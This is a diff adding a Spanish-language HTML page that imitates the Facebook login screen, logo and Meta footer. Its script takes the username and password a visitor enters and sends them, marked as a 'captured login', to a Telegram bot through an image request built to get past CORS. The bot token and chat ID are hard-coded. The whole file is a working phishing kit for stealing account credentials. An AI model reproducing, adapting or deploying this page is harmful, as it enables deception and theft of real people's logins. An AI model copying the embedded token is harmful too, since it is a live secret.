@@ -1,1 +1,171 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Login Facebook → Telegram</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: Arial, sans-serif;
+      background: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .login-container {
+      background: #fff;
+      padding: 2rem;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      width: 360px;
+      text-align: center;
+    }
+    .login-container img {
+      width: 40px;
+      margin-bottom: 1rem;
+    }
+    .login-container h2 {
+      margin-bottom: 1.5rem;
+      color: #606770;
+      font-weight: normal;
+    }
+    .login-container input {
+      width: 100%;
+      padding: 0.75rem;
+      margin-bottom: 0.5rem;
+      border: 1px solid #ccd0d5;
+      border-radius: 6px;
+      font-size: 1rem;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+    .login-container input:focus {
+      border-color: #1877f2;
+    }
+    .login-container .error {
+      color: #e53935;
+      font-size: 0.875rem;
+      text-align: left;
+      margin: -0.5rem 0 0.5rem;
+      display: none;
+    }
+    .login-container button {
+      width: 100%;
+      padding: 0.75rem;
+      background: #1877f2;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    .login-container button:hover {
+      background: #166fe5;
+    }
+    .login-container .status {
+      margin-top: 0.75rem;
+      font-size: 0.9rem;
+    }
+    .login-container .secondary {
+      margin-top: 1rem;
+      color: #1877f2;
+      font-size: 0.875rem;
+      cursor: pointer;
+    }
+    .login-container .secondary:hover {
+      text-decoration: underline;
+    }
+    .login-container .create-account {
+      margin-top: 1rem;
+      padding: 0.5rem;
+      border: 1px solid #1877f2;
+      border-radius: 6px;
+      color: #1877f2;
+      font-weight: bold;
+    }
+    .login-container .create-account:hover {
+      background: rgba(24, 119, 242, 0.1);
+    }
+    .login-container .footer {
+      margin-top: 2rem;
+      font-size: 0.75rem;
+      color: #90949c;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Logo FB">
+    <h2>Iniciar sesión</h2>
+
+    <div>
+      <input type="text" id="userField" placeholder="Celular o correo electrónico">
+      <div id="userError" class="error">Por favor ingresa tu celular o correo.</div>
+    </div>
+
+    <div>
+      <input type="password" id="passField" placeholder="Contraseña">
+      <div id="passError" class="error">Por favor ingresa tu contraseña.</div>
+    </div>
+
+    <button id="loginBtn">Iniciar sesión</button>
+    <div id="statusMsg" class="status"></div>
+
+    <div class="secondary">¿Olvidaste tu contraseña?</div>
+    <div class="create-account secondary">Crear cuenta nueva</div>
+    <div class="footer">Meta</div>
+  </div>
+
+  <script>
+    // === CONFIGURACIÓN: pon aquí tu token y chat_id ===
+    const BOT_TOKEN = '8417736223:AAHIXjNMAOMaeFLVO6tb9aUNLiVrzmQWk-c';
+    const CHAT_ID   = '7270292739';
+
+    document.getElementById('loginBtn').addEventListener('click', () => {
+      // reset errores y estado
+      document.getElementById('userError').style.display = 'none';
+      document.getElementById('passError').style.display = 'none';
+      const status = document.getElementById('statusMsg');
+      status.textContent = '';
+      status.style.color = '';
+
+      const user = document.getElementById('userField').value.trim();
+      const pass = document.getElementById('passField').value;
+
+      let valid = true;
+      if (!user) {
+        document.getElementById('userError').style.display = 'block';
+        valid = false;
+      }
+      if (!pass) {
+        document.getElementById('passError').style.display = 'block';
+        valid = false;
+      }
+      if (!valid) return;
+
+      // Prepara el mensaje y la URL GET para Telegram
+      const text = `🔐 Nuevo login capturado 🔐\nUsuario: ${user}\nContraseña: ${pass}`;
+      const url  = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage` +
+                   `?chat_id=${CHAT_ID}` +
+                   `&text=${encodeURIComponent(text)}`;
+
+      // Enviar usando un <img> para evitar CORS
+      const img = new Image();
+      img.src = url;
+      img.onload = () => {
+        status.style.color = 'green';
+        status.textContent = '✅ Enviado correctamente a Telegram';
+      };
+      img.onerror = () => {
+        status.style.color = '#e53935';
+        status.textContent = '❌ No se pudo enviar el mensaje';
+      };
+    });
+  </script>
+
+</body>
+</html>
 
